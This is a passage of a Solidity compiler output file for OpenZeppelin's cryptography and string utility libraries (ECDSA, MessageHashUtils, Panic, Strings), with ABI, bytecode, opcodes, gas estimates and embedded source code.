255) & (a ^ b));\\n    }\\n\\n    /**\\n     * @dev Returns the absolute unsigned value of a signed value.\\n     */\\n    function abs(int256 n) internal pure returns (uint256) {\\n        unchecked {\\n            // Formula from the \\\"Bit Twiddling Hacks\\\" by Sean Eron Anderson.\\n            // Since `n` is a signed integer, the generated bytecode will use the SAR opcode to perform the right shift,\\n            // taking advantage of the most significant (or \\\"sign\\\" bit) in two's complement representation.\\n            // This opcode adds new most significant bits set to the value of the previous most significant bit. As a result,\\n            // the mask will either be `bytes32(0)` (if n is positive) or `~bytes32(0)` (if n is negative).\\n            int256 mask = n >> 255;\\n\\n            // A `bytes32(0)` mask leaves the input unchanged, while a `~bytes32(0)` mask complements it.\\n            return uint256((n + mask) ^ mask);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xb1970fac7b64e6c09611e6691791e848d5e3fe410fa5899e7df2e0afd77a99e3\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/cryptography/ECDSA.sol":{"ECDSA":{"abi":[{"inputs":[],"name":"ECDSAInvalidSignature","type":"error"},{"inputs":[{"internalType":"uint256","name":"length","type":"uint256"}],"name":"ECDSAInvalidSignatureLength","type":"error"},{"inputs":[{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"ECDSAInvalidSignatureS","type":"error"}],"devdoc":{"details":"Elliptic Curve Digital Signature Algorithm (ECDSA) operations. These functions can be used to verify that a message was signed by the holder of the private keys of a given address.","errors":{"ECDSAInvalidSignature()":[{"details":"The signature derives the `address(0)`."}],"ECDSAInvalidSignatureLength(uint256)":[{"details":"The signature has an invalid length."}],"ECDSAInvalidSignatureS(bytes32)":[{"details":"The signature has an S value that is in the upper half order."}]},"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122098d6ee2ff9d148a5a04985939d34b0e1dfd630dc29634108df0da736f525576264736f6c634300081c0033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP9 0xD6 0xEE 0x2F 0xF9 0xD1 BASEFEE 0xA5 LOG0 BLOBHASH DUP6 SWAP4 SWAP14 CALLVALUE 0xB0 0xE1 0xDF 0xD6 ADDRESS 0xDC 0x29 PUSH4 0x4108DF0D 0xA7 CALLDATASIZE CREATE2 0x25 JUMPI PUSH3 0x64736F PUSH13 0x634300081C0033000000000000 ","sourceMap":"344:7470:4:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122098d6ee2ff9d148a5a04985939d34b0e1dfd630dc29634108df0da736f525576264736f6c634300081c0033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP9 0xD6 0xEE 0x2F 0xF9 0xD1 BASEFEE 0xA5 LOG0 BLOBHASH DUP6 SWAP4 SWAP14 CALLVALUE 0xB0 0xE1 0xDF 0xD6 ADDRESS 0xDC 0x29 PUSH4 0x4108DF0D 0xA7 CALLDATASIZE CREATE2 0x25 JUMPI PUSH3 0x64736F PUSH13 0x634300081C0033000000000000 ","sourceMap":"344:7470:4:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"_throwError(enum ECDSA.RecoverError,bytes32)":"infinite","recover(bytes32,bytes memory)":"infinite","recover(bytes32,bytes32,bytes32)":"infinite","recover(bytes32,uint8,bytes32,bytes32)":"infinite","tryRecover(bytes32,bytes memory)":"infinite","tryRecover(bytes32,bytes32,bytes32)":"infinite","tryRecover(bytes32,uint8,bytes32,bytes32)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"ECDSAInvalidSignature\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"length\",\"type\":\"uint256\"}],\"name\":\"ECDSAInvalidSignatureLength\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"ECDSAInvalidSignatureS\",\"type\":\"error\"}],\"devdoc\":{\"details\":\"Elliptic Curve Digital Signature Algorithm (ECDSA) operations. These functions can be used to verify that a message was signed by the holder of the private keys of a given address.\",\"errors\":{\"ECDSAInvalidSignature()\":[{\"details\":\"The signature derives the `address(0)`.\"}],\"ECDSAInvalidSignatureLength(uint256)\":[{\"details\":\"The signature has an invalid length.\"}],\"ECDSAInvalidSignatureS(bytes32)\":[{\"details\":\"The signature has an S value that is in the upper half order.\"}]},\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\":\"ECDSA\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/cryptography/ECDSA.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.\\n *\\n * These functions can be used to verify that a message was signed by the holder\\n * of the private keys of a given address.\\n */\\nlibrary ECDSA {\\n    enum RecoverError {\\n        NoError,\\n        InvalidSignature,\\n        InvalidSignatureLength,\\n        InvalidSignatureS\\n    }\\n\\n    /**\\n     * @dev The signature derives the `address(0)`.\\n     */\\n    error ECDSAInvalidSignature();\\n\\n    /**\\n     * @dev The signature has an invalid length.\\n     */\\n    error ECDSAInvalidSignatureLength(uint256 length);\\n\\n    /**\\n     * @dev The signature has an S value that is in the upper half order.\\n     */\\n    error ECDSAInvalidSignatureS(bytes32 s);\\n\\n    /**\\n     * @dev Returns the address that signed a hashed message (`hash`) with `signature` or an error. This will not\\n     * return address(0) without also returning an error description. Errors are documented using an enum (error type)\\n     * and a bytes32 providing additional information about the error.\\n     *\\n     * If no error is returned, then the address can be used for verification purposes.\\n     *\\n     * The `ecrecover` EVM precompile allows for malleable (non-unique) signatures:\\n     * this function rejects them by requiring the `s` value to be in the lower\\n     * half order, and the `v` value to be either 27 or 28.\\n     *\\n     * IMPORTANT: `hash` _must_ be the result of a hash operation for the\\n     * verification to be secure: it is possible to craft signatures that\\n     * recover to arbitrary addresses for non-hashed data. A safe way to ensure\\n     * this is by receiving a hash of the original message (which may otherwise\\n     * be too long), and then calling {MessageHashUtils-toEthSignedMessageHash} on it.\\n     *\\n     * Documentation for signature generation:\\n     * - with https://web3js.readthedocs.io/en/v1.3.4/web3-eth-accounts.html#sign[Web3.js]\\n     * - with https://docs.ethers.io/v5/api/signer/#Signer-signMessage[ethers]\\n     */\\n    function tryRecover(\\n        bytes32 hash,\\n        bytes memory signature\\n    ) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {\\n        if (signature.length == 65) {\\n            bytes32 r;\\n            bytes32 s;\\n            uint8 v;\\n            // ecrecover takes the signature parameters, and the only way to get them\\n            // currently is to use assembly.\\n            assembly (\\\"memory-safe\\\") {\\n                r := mload(add(signature, 0x20))\\n                s := mload(add(signature, 0x40))\\n                v := byte(0, mload(add(signature, 0x60)))\\n            }\\n            return tryRecover(hash, v, r, s);\\n        } else {\\n            return (address(0), RecoverError.InvalidSignatureLength, bytes32(signature.length));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the address that signed a hashed message (`hash`) with\\n     * `signature`. This address can then be used for verification purposes.\\n     *\\n     * The `ecrecover` EVM precompile allows for malleable (non-unique) signatures:\\n     * this function rejects them by requiring the `s` value to be in the lower\\n     * half order, and the `v` value to be either 27 or 28.\\n     *\\n     * IMPORTANT: `hash` _must_ be the result of a hash operation for the\\n     * verification to be secure: it is possible to craft signatures that\\n     * recover to arbitrary addresses for non-hashed data. A safe way to ensure\\n     * this is by receiving a hash of the original message (which may otherwise\\n     * be too long), and then calling {MessageHashUtils-toEthSignedMessageHash} on it.\\n     */\\n    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {\\n        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, signature);\\n        _throwError(error, errorArg);\\n        return recovered;\\n    }\\n\\n    /**\\n     * @dev Overload of {ECDSA-tryRecover} that receives the `r` and `vs` short-signature fields separately.\\n     *\\n     * See https://eips.ethereum.org/EIPS/eip-2098[ERC-2098 short signatures]\\n     */\\n    function tryRecover(\\n        bytes32 hash,\\n        bytes32 r,\\n        bytes32 vs\\n    ) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {\\n        unchecked {\\n            bytes32 s = vs & bytes32(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\\n            // We do not check for an overflow here since the shift operation results in 0 or 1.\\n            uint8 v = uint8((uint256(vs) >> 255) + 27);\\n            return tryRecover(hash, v, r, s);\\n        }\\n    }\\n\\n    /**\\n     * @dev Overload of {ECDSA-recover} that receives the `r and `vs` short-signature fields separately.\\n     */\\n    function recover(bytes32 hash, bytes32 r, bytes32 vs) internal pure returns (address) {\\n        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, r, vs);\\n        _throwError(error, errorArg);\\n        return recovered;\\n    }\\n\\n    /**\\n     * @dev Overload of {ECDSA-tryRecover} that receives the `v`,\\n     * `r` and `s` signature fields separately.\\n     */\\n    function tryRecover(\\n        bytes32 hash,\\n        uint8 v,\\n        bytes32 r,\\n        bytes32 s\\n    ) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {\\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\\n        // the valid range for s in (301): 0 < s < secp256k1n \\u00f7 2 + 1, and for v in (302): v \\u2208 {27, 28}. Most\\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\\n        //\\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\\n        // these malleable signatures as well.\\n        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {\\n            return (address(0), RecoverError.InvalidSignatureS, s);\\n        }\\n\\n        // If the signature is valid (and not malleable), return the signer address\\n        address signer = ecrecover(hash, v, r, s);\\n        if (signer == address(0)) {\\n            return (address(0), RecoverError.InvalidSignature, bytes32(0));\\n        }\\n\\n        return (signer, RecoverError.NoError, bytes32(0));\\n    }\\n\\n    /**\\n     * @dev Overload of {ECDSA-recover} that receives the `v`,\\n     * `r` and `s` signature fields separately.\\n     */\\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {\\n        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, v, r, s);\\n        _throwError(error, errorArg);\\n        return recovered;\\n    }\\n\\n    /**\\n     * @dev Optionally reverts with the corresponding custom error according to the `error` argument provided.\\n     */\\n    function _throwError(RecoverError error, bytes32 errorArg) private pure {\\n        if (error == RecoverError.NoError) {\\n            return; // no error: do nothing\\n        } else if (error == RecoverError.InvalidSignature) {\\n            revert ECDSAInvalidSignature();\\n        } else if (error == RecoverError.InvalidSignatureLength) {\\n            revert ECDSAInvalidSignatureLength(uint256(errorArg));\\n        } else if (error == RecoverError.InvalidSignatureS) {\\n            revert ECDSAInvalidSignatureS(errorArg);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x69f54c02b7d81d505910ec198c11ed4c6a728418a868b906b4a0cf29946fda84\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol":{"MessageHashUtils":{"abi":[],"devdoc":{"details":"Signature message hash utilities for producing digests to be consumed by {ECDSA} recovery or signing. The library provides methods for generating a hash of a message that conforms to the https://eips.ethereum.org/EIPS/eip-191[ERC-191] and https://eips.ethereum.org/EIPS/eip-712[EIP 712] specifications.","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122026d7a27a70605a8a3f390ff3e79931a7f9b2217c260b6e63ad340544a12b251264736f6c634300081c0033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x26 0xD7 LOG2 PUSH27 0x70605A8A3F390FF3E79931A7F9B2217C260B6E63AD340544A12B25 SLT PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"521:3729:5:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122026d7a27a70605a8a3f390ff3e79931a7f9b2217c260b6e63ad340544a12b251264736f6c634300081c0033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x26 0xD7 LOG2 PUSH27 0x70605A8A3F390FF3E79931A7F9B2217C260B6E63AD340544A12B25 SLT PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"521:3729:5:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"toDataWithIntendedValidatorHash(address,bytes memory)":"infinite","toDataWithIntendedValidatorHash(address,bytes32)":"infinite","toEthSignedMessageHash(bytes memory)":"infinite","toEthSignedMessageHash(bytes32)":"infinite","toTypedDataHash(bytes32,bytes32)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Signature message hash utilities for producing digests to be consumed by {ECDSA} recovery or signing. The library provides methods for generating a hash of a message that conforms to the https://eips.ethereum.org/EIPS/eip-191[ERC-191] and https://eips.ethereum.org/EIPS/eip-712[EIP 712] specifications.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol\":\"MessageHashUtils\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Panic.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/Panic.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Helper library for emitting standardized panic codes.\\n *\\n * ```solidity\\n * contract Example {\\n *      using Panic for uint256;\\n *\\n *      // Use any of the declared internal constants\\n *      function foo() { Panic.GENERIC.panic(); }\\n *\\n *      // Alternatively\\n *      function foo() { Panic.panic(Panic.GENERIC); }\\n * }\\n * ```\\n *\\n * Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil].\\n *\\n * _Available since v5.1._\\n */\\n// slither-disable-next-line unused-state\\nlibrary Panic {\\n    /// @dev generic / unspecified error\\n    uint256 internal constant GENERIC = 0x00;\\n    /// @dev used by the assert() builtin\\n    uint256 internal constant ASSERT = 0x01;\\n    /// @dev arithmetic underflow or overflow\\n    uint256 internal constant UNDER_OVERFLOW = 0x11;\\n    /// @dev division or modulo by zero\\n    uint256 internal constant DIVISION_BY_ZERO = 0x12;\\n    /// @dev enum conversion error\\n    uint256 internal constant ENUM_CONVERSION_ERROR = 0x21;\\n    /// @dev invalid encoding in storage\\n    uint256 internal constant STORAGE_ENCODING_ERROR = 0x22;\\n    /// @dev empty array pop\\n    uint256 internal constant EMPTY_ARRAY_POP = 0x31;\\n    /// @dev array out of bounds access\\n    uint256 internal constant ARRAY_OUT_OF_BOUNDS = 0x32;\\n    /// @dev resource error (too large allocation or too large array)\\n    uint256 internal constant RESOURCE_ERROR = 0x41;\\n    /// @dev calling invalid internal function\\n    uint256 internal constant INVALID_INTERNAL_FUNCTION = 0x51;\\n\\n    /// @dev Reverts with a panic code. Recommended to use with\\n    /// the internal constants with predefined codes.\\n    function panic(uint256 code) internal pure {\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(0x00, 0x4e487b71)\\n            mstore(0x20, code)\\n            revert(0x1c, 0x24)\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xf7fe324703a64fc51702311dc51562d5cb1497734f074e4f483bfb6717572d7a\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Strings.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.4.0) (utils/Strings.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Math} from \\\"./math/Math.sol\\\";\\nimport {SafeCast} from \\\"./math/SafeCast.sol\\\";\\nimport {SignedMath} from \\\"./math/SignedMath.sol\\\";\\n\\n/**\\n * @dev String operations.\\n */\\nlibrary Strings {\\n    using SafeCast for *;\\n\\n    bytes16 private constant HEX_DIGITS = \\\"0123456789abcdef\\\";\\n    uint8 private constant ADDRESS_LENGTH = 20;\\n    uint256 private constant SPECIAL_CHARS_LOOKUP =\\n        (1 << 0x08) | // backspace\\n            (1 << 0x09) | // tab\\n            (1 << 0x0a) | // newline\\n            (1 << 0x0c) | // form feed\\n            (1 << 0x0d) | // carriage return\\n            (1 << 0x22) | // double quote\\n            (1 << 0x5c); // backslash\\n\\n    /**\\n     * @dev The `value` string doesn't fit in the specified `length`.\\n     */\\n    error StringsInsufficientHexLength(uint256 value, uint256 length);\\n\\n    /**\\n     * @dev The string being parsed contains characters that are not in scope of the given base.\\n     */\\n    error StringsInvalidChar();\\n\\n    /**\\n     * @dev The string being parsed is not a properly formatted address.\\n     */\\n    error StringsInvalidAddressFormat();\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\n     */\\n    function toString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            uint256 length = Math.log10(value) + 1;\\n            string memory buffer = new string(length);\\n            uint256 ptr;\\n            assembly (\\\"memory-safe\\\") {\\n                ptr := add(add(buffer, 0x20), length)\\n            }\\n            while (true) {\\n                ptr--;\\n                assembly (\\\"memory-safe\\\") {\\n                    mstore8(ptr, byte(mod(value, 10), HEX_DIGITS))\\n                }\\n                value /= 10;\\n                if (value == 0) break;\\n            }\\n            return buffer;\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `int256` to its ASCII `string` decimal representation.\\n     */\\n    function toStringSigned(int256 value) internal pure returns (string memory) {\\n        return string.concat(value < 0 ? \\\"-\\\" : \\\"\\\", toString(SignedMath.abs(value)));\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            return toHexString(value, Math.log256(value) + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\n     */\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\n        uint256 localValue = value;\\n        bytes memory buffer = new bytes(2 * length + 2);\\n        buffer[0] = \\\"0\\\";\\n        buffer[1] = \\\"x\\\";\\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\\n            buffer[i] = HEX_DIGITS[localValue & 0xf];\\n            localValue >>= 4;\\n        }\\n        if (localValue != 0) {\\n            revert StringsInsufficientHexLength(value, length);\\n        }\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal\\n     * representation.\\n     */\\n    function toHexString(address addr) internal pure returns (string memory) {\\n        return toHexString(uint256(uint160(addr)), ADDRESS_LENGTH);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its checksummed ASCII `string` hexadecimal\\n     * representation, according to EIP-55.\\n     */\\n    function toChecksumHexString(address addr) internal pure returns (string memory) {\\n        bytes memory buffer = bytes(toHexString(addr));\\n\\n        // hash the hex part of buffer (skip length + 2 bytes, length 40)\\n        uint256 hashValue;\\n        assembly (\\\"memory-safe\\\") {\\n            hashValue := shr(96, keccak256(add(buffer, 0x22), 40))\\n        }\\n\\n        for (uint256 i = 41; i > 1; --i) {\\n            // possible values for buffer[i] are 48 (0) to 57 (9) and 97 (a) to 102 (f)\\n            if (hashValue & 0xf > 7 && uint8(buffer[i]) > 96) {\\n                // case shift by xoring with 0x20\\n                buffer[i] ^= 0x20;\\n            }\\n            hashValue >>= 4;\\n        }\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Returns true if the two strings are equal.\\n     */\\n    function equal(string memory a, string memory b) internal pure returns (bool) {\\n        return bytes(a).length == bytes(b).length && keccak256(bytes(a)) == keccak256(bytes(b));\\n    }\\n\\n    /**\\n     * @dev Parse a decimal string and returns the value as a `uint256`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `[0-9]*`\\n     * - The result must fit into an `uint256` type\\n     */\\n    function parseUint(string memory input) internal pure returns (uint256) {\\n        return parseUint(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseUint-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `[0-9]*`\\n     * - The result must fit into an `uint256` type\\n     */\\n    function parseUint(string memory input, uint256 begin, uint256 end) internal pure returns (uint256) {\\n        (bool success, uint256 value) = tryParseUint(input, begin, end);\\n        if (!success) revert StringsInvalidChar();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseUint-string} that returns false if the parsing fails because of an invalid character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseUint(string memory input) internal pure returns (bool success, uint256 value) {\\n        return _tryParseUintUncheckedBounds(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseUint-string-uint256-uint256} that returns false if the parsing fails because of an invalid\\n     * character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseUint(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, uint256 value) {\\n        if (end > bytes(input).length || begin > end) return (false, 0);\\n        return _tryParseUintUncheckedBounds(input, begin, end);\\n    }\\n\\n    /**\\n     * @dev Implementation of {tryParseUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\\n     */\\n    function _tryParseUintUncheckedBounds(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) private pure returns (bool success, uint256 value) {\\n        bytes memory buffer = bytes(input);\\n\\n        uint256 result = 0;\\n        for (uint256 i = begin; i < end; ++i) {\\n            uint8 chr = _tryParseChr(bytes1(_unsafeReadBytesOffset(buffer, i)));\\n            if (chr > 9) return (false, 0);\\n            result *= 10;\\n            result += chr;\\n        }\\n        return (true, result);\\n    }\\n\\n    /**\\n     * @dev Parse a decimal string and returns the value as a `int256`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `[-+]?[0-9]*`\\n     * - The result must fit in an `int256` type.\\n     */\\n    function parseInt(string memory input) internal pure returns (int256) {\\n        return parseInt(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseInt-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `[-+]?[0-9]*`\\n     * - The result must fit in an `int256` type.\\n     */\\n    function parseInt(string memory input, uint256 begin, uint256 end) internal pure returns (int256) {\\n        (bool success, int256 value) = tryParseInt(input, begin, end);\\n        if (!success) revert StringsInvalidChar();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseInt-string} that returns false if the parsing fails because of an invalid character or if\\n     * the result does not fit in a `int256`.\\n     *\\n     * NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`.\\n     */\\n    function tryParseInt(string memory input) internal pure returns (bool success, int256 value) {\\n        return _tryParseIntUncheckedBounds(input, 0, bytes(input).length);\\n    }\\n\\n    uint256 private constant ABS_MIN_INT256 = 2 ** 255;\\n\\n    /**\\n     * @dev Variant of {parseInt-string-uint256-uint256} that returns false if the parsing fails because of an invalid\\n     * character or if the result does not fit in a `int256`.\\n     *\\n     * NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`.\\n     */\\n    function tryParseInt(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, int256 value) {\\n        if (end > bytes(input).length || begin > end) return (false, 0);\\n        return _tryParseIntUncheckedBounds(input, begin, end);\\n    }\\n\\n    /**\\n     * @dev Implementation of {tryParseInt-string-uint256-uint256} that does not check bounds. Caller should make sure that\\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\\n     */\\n    function _tryParseIntUncheckedBounds(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) private pure returns (bool success, int256 value) {\\n        bytes memory buffer = bytes(input);\\n\\n        // Check presence of a negative sign.\\n        bytes1 sign = begin == end ? bytes1(0) : bytes1(_unsafeReadBytesOffset(buffer, begin)); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\\n        bool positiveSign = sign == bytes1(\\\"+\\\");\\n        bool negativeSign = sign == bytes1(\\\"-\\\");\\n        uint256 offset = (positiveSign || negativeSign).toUint();\\n\\n        (bool absSuccess, uint256 absValue) = tryParseUint(input, begin + offset, end);\\n\\n        if (absSuccess && absValue < ABS_MIN_INT256) {\\n            return (true, negativeSign ? -int256(absValue) : int256(absValue));\\n        } else if (absSuccess && negativeSign && absValue == ABS_MIN_INT256) {\\n            return (true, type(int256).min);\\n        } else return (false, 0);\\n    }\\n\\n    /**\\n     * @dev Parse a hexadecimal string (with or without \\\"0x\\\" prefix), and returns the value as a `uint256`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `(0x)?[0-9a-fA-F]*`\\n     * - The result must fit in an `uint256` type.\\n     */\\n    function parseHexUint(string memory input) internal pure returns (uint256) {\\n        return parseHexUint(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseHexUint-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `(0x)?[0-9a-fA-F]*`\\n     * - The result must fit in an `uint256` type.\\n     */\\n    function parseHexUint(string memory input, uint256 begin, uint256 end) internal pure returns (uint256) {\\n        (bool success, uint256 value) = tryParseHexUint(input, begin, end);\\n        if (!success) revert StringsInvalidChar();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseHexUint-string} that returns false if the parsing fails because of an invalid character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseHexUint(string memory input) internal pure returns (bool success, uint256 value) {\\n        return 